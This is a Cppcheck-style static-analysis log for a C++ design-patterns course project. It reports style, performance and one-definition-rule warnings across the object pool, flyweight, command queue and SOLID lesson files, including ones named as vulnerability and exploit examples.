D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_cpp23_comparison.cpp:20:10: performance: inconclusive: Technically the member function 'Resource::use' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void use() { std::cout << "Using resource\n"; }
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_cpp23_comparison.cpp:21:10: performance: inconclusive: Technically the member function 'Resource::reset' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void reset() { /* Reset state */ }
         ^
172/194 files checked 90% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp ...
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: style: inconclusive: Member variable 'ObjectPool < DatabaseConnection >::factory_' is in the wrong place in the initializer list. [initializerList]
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:49:30: note: Member variable 'ObjectPool < DatabaseConnection >::factory_' is in the wrong place in the initializer list.
        : maxSize_(maxSize), factory_(factory) {
                             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: note: Member variable 'ObjectPool < DatabaseConnection >::factory_' is in the wrong place in the initializer list.
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: style: inconclusive: Member variable 'ObjectPool < GameObject >::factory_' is in the wrong place in the initializer list. [initializerList]
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:49:30: note: Member variable 'ObjectPool < GameObject >::factory_' is in the wrong place in the initializer list.
        : maxSize_(maxSize), factory_(factory) {
                             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: note: Member variable 'ObjectPool < GameObject >::factory_' is in the wrong place in the initializer list.
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: style: inconclusive: Member variable 'ObjectPool < NetworkSocket >::factory_' is in the wrong place in the initializer list. [initializerList]
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:49:30: note: Member variable 'ObjectPool < NetworkSocket >::factory_' is in the wrong place in the initializer list.
        : maxSize_(maxSize), factory_(factory) {
                             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:33:41: note: Member variable 'ObjectPool < NetworkSocket >::factory_' is in the wrong place in the initializer list.
    std::function<std::unique_ptr<T>()> factory_;
                                        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:384:10: style: inconclusive: Technically the member function 'GameObject::render' can be const. [functionConst]
    void render() {
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:432:10: style: inconclusive: Technically the member function 'NetworkSocket::sendData' can be const. [functionConst]
    bool sendData(const std::string& data) {
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:412:5: style: Class 'NetworkSocket' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    NetworkSocket(const std::string& addr = "127.0.0.1", int p = 8080)
    ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:297:6: style: The destructor '~DatabaseConnection' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~DatabaseConnection() {
     ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:273:14: note: Virtual destructor in base class
    virtual ~Resettable() = default;
             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:297:6: note: Destructor in derived class
    ~DatabaseConnection() {
     ^
173/194 files checked 91% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_vulnerabilities.cpp ...
174/194 files checked 91% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp ...
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:47:9: performance: Variable 'created_at_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        created_at_ = std::chrono::steady_clock::now();
        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:127:9: performance: Variable 'created_at_' is assigned in constructor body. Consider performing initialization in initialization list. [useInitializationList]
        created_at_ = std::chrono::steady_clock::now();
        ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:52:6: style: The destructor '~DatabaseConnection' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~DatabaseConnection() {
     ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:28:14: note: Virtual destructor in base class
    virtual ~Resource() = default;
             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:52:6: note: Destructor in derived class
    ~DatabaseConnection() {
     ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:132:6: style: The destructor '~NetworkSocket' overrides a destructor in a base class but is not marked with a 'override' specifier. [missingOverride]
    ~NetworkSocket() {
     ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:28:14: note: Virtual destructor in base class
    virtual ~Resource() = default;
             ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:132:6: note: Destructor in derived class
    ~NetworkSocket() {
     ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:494:16: style: Variable 'conn' can be declared as reference to const [constVariableReference]
    for (auto& conn : connections) {
               ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:533:16: style: Variable 'socket' can be declared as reference to const [constVariableReference]
    for (auto& socket : sockets) {
               ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:570:16: style: Variable 'buffer' can be declared as reference to const [constVariableReference]
    for (auto& buffer : buffers) {
               ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:607:16: style: Variable 'resource' can be declared as reference to const [constVariableReference]
    for (auto& resource : resources) {
               ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:561:25: style: Variable 'data' is assigned a value that is never used. [unreadVariable]
            std::string data = buffer->readData();
                        ^
175/194 files checked 92% done
Checking D:\Work\Patterns\09-performance\lesson_9_1_object_pool\secure_object_pool_alternatives.cpp ...
176/194 files checked 93% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\exploits\flyweight_exploits.cpp ...
177/194 files checked 93% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_cpp23_comparison.cpp ...
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_cpp23_comparison.cpp:23:5: style: Class 'Flyweight' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    Flyweight(std::string s) : intrinsic_(std::move(s)) {}
    ^
178/194 files checked 93% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp ...
179/194 files checked 94% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_vulnerabilities.cpp ...
180/194 files checked 94% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp ...
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:150:10: performance: inconclusive: Technically the member function 'CharacterStyle::applyStyle' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    void applyStyle() const {
         ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:201:19: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            total += pair.second->getMemorySize();
                  ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:277:19: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            total += ch->getMemorySize();
                  ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:326:19: style: Consider using std::accumulate algorithm instead of a raw loop. [useStlAlgorithm]
            total += ch->getMemorySize();
                  ^
181/194 files checked 95% done
Checking D:\Work\Patterns\09-performance\lesson_9_2_flyweight\secure_flyweight_alternatives.cpp ...
182/194 files checked 95% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp ...
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:211:5: style: Class 'BatchProcessor' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    BatchProcessor(size_t max_batch = 100,
    ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:285:28: style: Consider using std::transform algorithm instead of a raw loop. [useStlAlgorithm]
            sorted_batches.push_back(std::move(pair.second));
                           ^
183/194 files checked 96% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_cpp23_comparison.cpp ...
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_cpp23_comparison.cpp:24:5: style: Class 'PrintCommand' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    PrintCommand(int v) : value_(v) {}
    ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_cpp23_comparison.cpp:30:46: style: class member 'CommandQueue::queue_' is never used. [unusedStructMember]
        std::queue<std::unique_ptr<Command>> queue_;
                                             ^
184/194 files checked 96% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_pattern.cpp ...
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_pattern.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_pattern.cpp:160:5: style: Class 'CommandQueue' has a constructor with 1 argument that is not explicit. [noExplicitConstructor]
    CommandQueue(size_t max_batch = 50,
    ^
185/194 files checked 97% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_vulnerabilities.cpp ...
186/194 files checked 97% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\exploits\command_queue_exploits.cpp ...
187/194 files checked 97% done
Checking D:\Work\Patterns\09-performance\lesson_9_3_command_queue\secure_command_queue_alternatives.cpp ...
188/194 files checked 98% done
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp ...
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:92:12: performance: inconclusive: Technically the member function 'SafeCalculator::divide' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    double divide(double a, double b) {
           ^
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:104:20: style: Unused variable: calc [unusedVariable]
    SafeCalculator calc;
                   ^
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_expected...
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:67:40: performance: inconclusive: Technically the member function 'SafeCalculator::divide' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::expected<double, std::string> divide(double a, double b) {
                                       ^
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_expected;__cpp_lib_flat_map;__cpp_lib_generator;__cpp_lib_print...
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:459:49: style: inconclusive: Technically the member function 'ModernPattern::getAllData' can be const. [functionConst]
    std::generator<std::pair<int, std::string>> getAllData() {
                                                ^
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:475:40: style: inconclusive: Technically the member function 'ModernPattern::calculateAverage' can be const. [functionConst]
    std::expected<double, std::string> calculateAverage() {
                                       ^
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_expected;__cpp_lib_generator;__cpp_lib_print...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_expected;__cpp_lib_print...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_flat_map...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_flat_set...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_generator...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_jthread...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_mdspan...
D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp:0:0: information: Limiting analysis of branches. Use --check-level=exhaustive to analyze all branches. [normalCheckLevelMaxBranches]

^
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_print...
Checking D:\Work\Patterns\CPP23_NEW_FEATURES_EXAMPLES.cpp: __cpp_lib_stacktrace...
189/194 files checked 99% done
Checking D:\Work\Patterns\EXPLOITS_TEMPLATE.cpp ...
190/194 files checked 99% done
Checking D:\Work\Patterns\SECURE_ALTERNATIVES_TEMPLATE.cpp ...
191/194 files checked 99% done
Checking D:\Work\Patterns\VULNERABILITIES_TEMPLATE.cpp ...
192/194 files checked 99% done
Checking D:\Work\Patterns\common\logger.cpp ...
D:\Work\Patterns\common\logger.cpp:52:17: performance: inconclusive: Technically the member function 'cpp_patterns::FileLogger::getPrefix' can be static (but you may consider moving to unnamed namespace). [functionStatic]
    std::string getPrefix() const {
                ^
193/194 files checked 99% done
Checking D:\Work\Patterns\common\utils.cpp ...
D:\Work\Patterns\common\utils.cpp:45:14: style: inconclusive: Technically the member function 'cpp_patterns::Logger::log' can be const. [functionConst]
void Logger::log(Level level, const std::string& message) {
             ^
D:\Work\Patterns\common\utils.h:54:10: note: Technically the member function 'cpp_patterns::Logger::log' can be const.
    void log(Level level, const std::string& message);
         ^
D:\Work\Patterns\common\utils.cpp:45:14: note: Technically the member function 'cpp_patterns::Logger::log' can be const.
void Logger::log(Level level, const std::string& message) {
             ^
D:\Work\Patterns\common\utils.cpp:58:21: performance: inconclusive: Technically the member function 'cpp_patterns::Logger::levelToString' can be static (but you may consider moving to unnamed namespace). [functionStatic]
std::string Logger::levelToString(Level level) const {
                    ^
D:\Work\Patterns\common\utils.h:55:17: note: Technically the member function 'cpp_patterns::Logger::levelToString' can be static (but you may consider moving to unnamed namespace).
    std::string levelToString(Level level) const;
                ^
D:\Work\Patterns\common\utils.cpp:58:21: note: Technically the member function 'cpp_patterns::Logger::levelToString' can be static (but you may consider moving to unnamed namespace).
std::string Logger::levelToString(Level level) const {
                    ^
194/194 files checked 100% done
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\exploits\hello_world_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablehello_world' [ctuOneDefinitionRuleViolation]
class Vulnerablehello_world {
^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\hello_world_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablehello_world'
class Vulnerablehello_world {
^
D:\Work\Patterns\01-basics\lesson_1_1_hello_world\exploits\hello_world_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablehello_world'
class Vulnerablehello_world {
^
D:\Work\Patterns\01-basics\lesson_1_2_raii\exploits\raii_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerableraii' [ctuOneDefinitionRuleViolation]
class Vulnerableraii {
^
D:\Work\Patterns\01-basics\lesson_1_2_raii\raii_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableraii'
class Vulnerableraii {
^
D:\Work\Patterns\01-basics\lesson_1_2_raii\exploits\raii_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerableraii'
class Vulnerableraii {
^
D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\exploits\smart_pointers_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers' [ctuOneDefinitionRuleViolation]
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\smart_pointers_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers'
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\01-basics\lesson_1_3_smart_pointers\exploits\smart_pointers_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesmart_pointers'
class Vulnerablesmart_pointers {
^
D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\exploits\move_semantics_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics' [ctuOneDefinitionRuleViolation]
class Vulnerablemove_semantics {
^
D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\move_semantics_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics'
class Vulnerablemove_semantics {
^
D:\Work\Patterns\01-basics\lesson_1_4_move_semantics\exploits\move_semantics_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablemove_semantics'
class Vulnerablemove_semantics {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:40:1: error: The one definition rule is violated, different classes/structs have the same name 'BadPaymentProcessor' [ctuOneDefinitionRuleViolation]
class BadPaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:196:1: note: The one definition rule is violated, different classes/structs have the same name 'BadPaymentProcessor'
class BadPaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:40:1: note: The one definition rule is violated, different classes/structs have the same name 'BadPaymentProcessor'
class BadPaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:121:1: error: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment' [ctuOneDefinitionRuleViolation]
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:236:1: note: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment'
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:121:1: note: The one definition rule is violated, different classes/structs have the same name 'CreditCardPayment'
class CreditCardPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:181:1: error: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment' [ctuOneDefinitionRuleViolation]
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:248:1: note: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment'
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:181:1: note: The one definition rule is violated, different classes/structs have the same name 'PayPalPayment'
class PayPalPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:240:1: error: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment' [ctuOneDefinitionRuleViolation]
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:260:1: note: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment'
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:240:1: note: The one definition rule is violated, different classes/structs have the same name 'BankTransferPayment'
class BankTransferPayment : public PaymentStrategy {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:421:1: error: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor' [ctuOneDefinitionRuleViolation]
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:286:1: note: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor'
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\ocp_example.cpp:421:1: note: The one definition rule is violated, different classes/structs have the same name 'PaymentProcessor'
class PaymentProcessor {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:218:1: error: The one definition rule is violated, different classes/structs have the same name 'Rectangle' [ctuOneDefinitionRuleViolation]
class Rectangle : public Shape {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:315:1: note: The one definition rule is violated, different classes/structs have the same name 'Rectangle'
class Rectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:218:1: note: The one definition rule is violated, different classes/structs have the same name 'Rectangle'
class Rectangle : public Shape {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:73:1: error: The one definition rule is violated, different classes/structs have the same name 'BadSquare' [ctuOneDefinitionRuleViolation]
class BadSquare : public BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:330:1: note: The one definition rule is violated, different classes/structs have the same name 'BadSquare'
class BadSquare : public Rectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\lsp_example.cpp:73:1: note: The one definition rule is violated, different classes/structs have the same name 'BadSquare'
class BadSquare : public BadRectangle {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:57:1: error: The one definition rule is violated, different classes/structs have the same name 'BadPrinter' [ctuOneDefinitionRuleViolation]
class BadPrinter : public BadIDevice {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:438:1: note: The one definition rule is violated, different classes/structs have the same name 'BadPrinter'
class BadPrinter : public BadIDevice {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:57:1: note: The one definition rule is violated, different classes/structs have the same name 'BadPrinter'
class BadPrinter : public BadIDevice {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:258:1: error: The one definition rule is violated, different classes/structs have the same name 'Printer' [ctuOneDefinitionRuleViolation]
class Printer : public IPrintable, public ICopyable, public INetworkConnectable, public IUSBConnectable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:507:1: note: The one definition rule is violated, different classes/structs have the same name 'Printer'
class Printer : public IPrintable, public ICopyable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:258:1: note: The one definition rule is violated, different classes/structs have the same name 'Printer'
class Printer : public IPrintable, public ICopyable, public INetworkConnectable, public IUSBConnectable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:301:1: error: The one definition rule is violated, different classes/structs have the same name 'Scanner' [ctuOneDefinitionRuleViolation]
class Scanner : public IReadable, public IScannable, public IBluetoothConnectable, public IUSBConnectable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:518:1: note: The one definition rule is violated, different classes/structs have the same name 'Scanner'
class Scanner : public IReadable, public IScannable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:301:1: note: The one definition rule is violated, different classes/structs have the same name 'Scanner'
class Scanner : public IReadable, public IScannable, public IBluetoothConnectable, public IUSBConnectable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:344:1: error: The one definition rule is violated, different classes/structs have the same name 'MultiFunctionDevice' [ctuOneDefinitionRuleViolation]
class MultiFunctionDevice : public IPrintable, public IScannable, public IFaxable,
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:529:1: note: The one definition rule is violated, different classes/structs have the same name 'MultiFunctionDevice'
class MultiFunctionDevice : public IPrintable, public IScannable, public IFaxable, public ICopyable {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\isp_example.cpp:344:1: note: The one definition rule is violated, different classes/structs have the same name 'MultiFunctionDevice'
class MultiFunctionDevice : public IPrintable, public IScannable, public IFaxable,
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:44:1: error: The one definition rule is violated, different classes/structs have the same name 'BadFileLogger' [ctuOneDefinitionRuleViolation]
class BadFileLogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:559:1: note: The one definition rule is violated, different classes/structs have the same name 'BadFileLogger'
class BadFileLogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:44:1: note: The one definition rule is violated, different classes/structs have the same name 'BadFileLogger'
class BadFileLogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:67:1: error: The one definition rule is violated, different classes/structs have the same name 'BadEmailNotification' [ctuOneDefinitionRuleViolation]
class BadEmailNotification {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:566:1: note: The one definition rule is violated, different classes/structs have the same name 'BadEmailNotification'
class BadEmailNotification {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:67:1: note: The one definition rule is violated, different classes/structs have the same name 'BadEmailNotification'
class BadEmailNotification {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:83:1: error: The one definition rule is violated, different classes/structs have the same name 'BadBusinessLogic' [ctuOneDefinitionRuleViolation]
class BadBusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:573:1: note: The one definition rule is violated, different classes/structs have the same name 'BadBusinessLogic'
class BadBusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:83:1: note: The one definition rule is violated, different classes/structs have the same name 'BadBusinessLogic'
class BadBusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:145:1: error: The one definition rule is violated, different classes/structs have the same name 'FileLogger' [ctuOneDefinitionRuleViolation]
class FileLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:607:1: note: The one definition rule is violated, different classes/structs have the same name 'FileLogger'
class FileLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:145:1: note: The one definition rule is violated, different classes/structs have the same name 'FileLogger'
class FileLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:187:1: error: The one definition rule is violated, different classes/structs have the same name 'ConsoleLogger' [ctuOneDefinitionRuleViolation]
class ConsoleLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:615:1: note: The one definition rule is violated, different classes/structs have the same name 'ConsoleLogger'
class ConsoleLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:187:1: note: The one definition rule is violated, different classes/structs have the same name 'ConsoleLogger'
class ConsoleLogger : public ILogger {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:272:1: error: The one definition rule is violated, different classes/structs have the same name 'EmailNotificationService' [ctuOneDefinitionRuleViolation]
class EmailNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:622:1: note: The one definition rule is violated, different classes/structs have the same name 'EmailNotificationService'
class EmailNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:272:1: note: The one definition rule is violated, different classes/structs have the same name 'EmailNotificationService'
class EmailNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:316:1: error: The one definition rule is violated, different classes/structs have the same name 'SMSNotificationService' [ctuOneDefinitionRuleViolation]
class SMSNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:630:1: note: The one definition rule is violated, different classes/structs have the same name 'SMSNotificationService'
class SMSNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:316:1: note: The one definition rule is violated, different classes/structs have the same name 'SMSNotificationService'
class SMSNotificationService : public INotificationService {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:405:1: error: The one definition rule is violated, different classes/structs have the same name 'BusinessLogic' [ctuOneDefinitionRuleViolation]
class BusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_principles.cpp:639:1: note: The one definition rule is violated, different classes/structs have the same name 'BusinessLogic'
class BusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\dip_example.cpp:405:1: note: The one definition rule is violated, different classes/structs have the same name 'BusinessLogic'
class BusinessLogic {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\exploits\solid_exploits.cpp:16:1: error: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesolid' [ctuOneDefinitionRuleViolation]
class Vulnerablesolid {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\solid_vulnerabilities.cpp:20:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesolid'
class Vulnerablesolid {
^
D:\Work\Patterns\02-principles\lesson_2_1_solid\exploits\solid_exploits.cpp:16:1: note: The one definition rule is violated, different classes/structs have the same name 'Vulnerablesolid'
class Vulnerablesolid {
^
